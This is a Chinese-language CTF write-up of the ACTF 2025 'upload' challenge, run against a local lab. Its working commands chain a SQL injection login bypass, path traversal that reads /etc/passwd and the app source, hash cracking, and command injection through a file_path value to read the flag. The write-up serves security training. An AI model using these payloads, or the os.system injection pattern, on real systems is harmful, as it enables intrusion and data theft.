---
title: "9th ACTF 2025：多阶段漏洞链 upload"
slug: "ctf-actf-2025-upload"
date: 2026-08-31T11:47:04+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "SQL 注入、文件读取、身份伪造、命令注入与无回显外带串成的一条完整攻击链。"
summary: "SQL 注入、文件读取、身份伪造、命令注入与无回显外带串成的一条完整攻击链。"
tags: ["CTF", "ACTF", "漏洞链"]
categories: ["CTF Writeup"]
series: ["CTF Writeup"]
weight: 10
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/ctf-writeups/10.9th-ACTF-2025里面的upload.md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/ctf-actf-2025-upload/workflow.svg" alt="从 SQL 注入登录到路径穿越读源码，再破解管理员密码并写入命令结果。" loading="lazy">
  <figcaption>图 1 · ACTF 多阶段攻击链。从 SQL 注入登录到路径穿越读源码，再破解管理员密码并写入命令结果。</figcaption>
</figure>

## 1. 准备变量

这是一个多阶段靶场，以下命令都在授权环境中执行：

```bash
export TARGET='http://127.0.0.1:<target-port>'
export COOKIE='/tmp/actf.cookie'
export WORDLIST='/path/to/SecLists/Fuzzing/LFI/LFI-LFISuite-pthtotest.txt'
```

## 2. SQL 注入进入系统

先抓登录请求，确认字段名。示例：

```bash
curl -i -sS -c "$COOKIE" \
  -X POST "$TARGET/login" \
  --data-urlencode "username=admin' OR 1=1#" \
  --data-urlencode 'password=x'
```

回到页面确认拿到普通用户会话。

如果登录字段使用 JSON，改为：

```bash
curl -i -sS -c "$COOKIE" \
  -X POST "$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  --data '{"username":"admin'\'' OR 1=1#","password":"x"}'
```

## 3. 上传图片并观察路径

```bash
printf '\x89PNG\r\n\x1a\n' > /tmp/test.png
curl -i -sS -b "$COOKIE" \
  -F 'file=@/tmp/test.png' \
  "$TARGET/upload"
```

响应或后续页面中应出现类似：

```text
/upload?file_path=<uid>_cover.png
```

记录 `file_path` 的实际格式，准备对参数做路径穿越测试。

## 4. 验证路径穿越

```bash
ffuf -b "$COOKIE" \
  -u "$TARGET/upload?file_path=FUZZ" \
  -w "$WORDLIST" \
  -mc all -fs 0
```

确认 `../../../../etc/passwd` 能读到内容后，再读应用源码：

```bash
curl -sS -b "$COOKIE" --get \
  --data-urlencode 'file_path=../../../../app/app.py' \
  "$TARGET/upload" -o /tmp/app.b64
base64 -d /tmp/app.b64 > /tmp/app.py
sed -n '1,220p' /tmp/app.py
```

如果源码是明文，跳过 `base64 -d`。

## 5. 从源码里找管理员密码

源码中经常会看到 SHA-256 比较或哈希常量。把 hash 保存：

```bash
grep -oE '[a-f0-9]{64}' /tmp/app.py | head -n 1 > /tmp/hash.txt
cat /tmp/hash.txt
```

用 hashcat 模式 1400：

```bash
hashcat -m 1400 -a 0 \
  -o /tmp/cracked.txt \
  /tmp/hash.txt \
  /path/to/SecLists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000000.txt \
  --force
```

查看：

```bash
cat /tmp/cracked.txt
```

原题对应的管理员口令为：

```text
backdoor
```

## 6. 用管理员登录并验证 RCE

```bash
curl -i -sS -c "$COOKIE" \
  -X POST "$TARGET/login" \
  --data-urlencode 'username=admin' \
  --data-urlencode 'password=backdoor'
```

源码里的危险拼接类似：

```python
os.system(f"base64 {file_path} > /tmp/{file_path}.b64")
```

这说明 `file_path` 可以注入分号。先执行无害命令：

```bash
curl -sS -b "$COOKIE" --get \
  --data-urlencode 'file_path=1.txt; id > /app/result.txt;' \
  "$TARGET/upload"
```

再用路径穿越读取结果：

```bash
curl -sS -b "$COOKIE" --get \
  --data-urlencode 'file_path=../../../../app/result.txt' \
  "$TARGET/upload" -o /tmp/result.b64
base64 -d /tmp/result.b64
```

把命令换成 `ls / > /app/result.txt` 枚举根目录。

## 7. 定位 flag

原题中根目录存在：

```text
/Fl4g_is_H3r3
```

读取：

```bash
curl -sS -b "$COOKIE" --get \
  --data-urlencode 'file_path=../../../../Fl4g_is_H3r3' \
  "$TARGET/upload"
```

如果返回 Base64，先 `base64 -d` 再查看。

## 8. 完整攻击链复盘

```text
SQLi 登录
  → 上传图片获得 file_path
  → file_path 路径穿越
  → 读 /app/app.py
  → SHA-256 哈希爆破
  → admin/backdoor 登录
  → os.system 命令注入
  → 写结果文件
  → 路径穿越读结果
  → 读 flag
```

## 9. 排错

| 现象 | 原因 | 处理 |
| --- | --- | --- |
| 登录 SQLi 无效 | 字段名/编码不对 | 用 Burp 复制原始请求 |
| `ffuf` 全部相同长度 | WAF/错误页统一 | 加 `-mr` 或比较 body hash |
| 源码 Base64 解码失败 | 响应含提示文本 | 只截取 Base64 行 |
| hashcat 无结果 | 字典不对 | 换规则或扩大字典 |
| 命令写入失败 | 当前目录不可写 | 写入 `/tmp` 或 `/app` 可写目录 |
